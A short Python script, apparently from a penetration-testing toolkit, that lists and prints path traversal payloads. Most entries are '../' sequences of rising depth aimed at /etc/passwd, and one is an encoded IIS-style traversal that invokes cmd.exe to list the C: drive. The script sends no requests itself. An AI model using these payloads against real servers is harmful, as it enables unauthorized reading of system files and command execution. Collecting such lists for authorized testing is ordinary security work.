#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# author: Leandro Batista
# e-mail: leandrobatistapereira98@gmail.com

path = ['../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../../etc/passwd',
        '../../../../../../../../../../etc/passwd',
        '/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:\\']


def path_trasversal():
    for p in enumerate(path):
        print(p)


path_trasversal()